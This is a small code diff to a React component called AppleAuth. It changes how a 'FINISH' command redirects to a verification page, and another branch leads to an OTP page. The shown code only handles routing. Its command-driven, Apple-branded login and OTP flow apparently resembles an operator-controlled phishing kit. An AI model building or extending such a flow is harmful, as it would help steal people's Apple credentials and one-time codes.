@@ -33,10 +33,7 @@ export default function AppleAuth() {
                 router.push('/AppleOtpPage');
             }, 1500);
         } else if (command === 'FINISH') {
-            setTimeout(() => {
-                resetCommand(); 
-                router.push('/verificationPage');
-            }, 1500);
+            router.push('/verificationPage');
         }
     }, [command, router, resetCommand]);
 
